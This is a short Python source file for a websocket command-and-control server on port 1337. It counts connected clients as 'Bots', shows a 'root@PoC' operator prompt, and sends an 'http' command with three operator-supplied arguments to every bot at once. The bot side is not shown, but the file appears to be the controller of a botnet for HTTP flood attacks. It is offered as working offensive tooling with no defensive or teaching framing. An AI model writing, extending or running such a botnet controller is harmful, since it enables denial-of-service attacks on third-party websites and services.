from websocket_server import WebsocketServer
import threading, logging, json, os
from colored import fg

class WsServer(threading.Thread):
    def __init__(self, port: int):
        self.server = WebsocketServer(host= '0.0.0.0', port= port, loglevel= logging.FATAL)
        threading.Thread.__init__(self)
    
    def reset_screen(self):
        os.system('clear')
        print(f'\33]0;{len(self.server.clients)} Bots\a', end='', flush=True)
        
    def control_thread(self):
        self.reset_screen()
        while True:
            command = input(f'{fg(238)}root{fg(161)}@{fg(238)}PoC &~>{fg(250)} ').split(' ')

            if command[0] == 'http':
                self.server.send_message_to_all(self.build_message('http', [command[1], command[2], command[3]]))
            elif command[0] == 'clear':
                self.reset_screen()

    def build_message(self, command: str, args: list= None):
        return json.dumps({'command': command, 'args': args})

    def msg_recv(self, client, server: WebsocketServer, message):
        pass #print(message)

    def new_client(self, client, server: WebsocketServer):
        print(f'\33]0;{len(self.server.clients)} Bots\a', end='', flush=True)
    
    def left_client(self, client, server: WebsocketServer):
        print(f'\33]0;{len(self.server.clients)} Bots\a', end='', flush=True)

    def run(self):
        threading.Thread(target= self.control_thread).start()
        self.server.set_fn_new_client(self.new_client)
        self.server.set_fn_client_left(self.left_client)
        self.server.set_fn_message_received(self.msg_recv)
        self.server.run_forever()

WsServer(1337).start()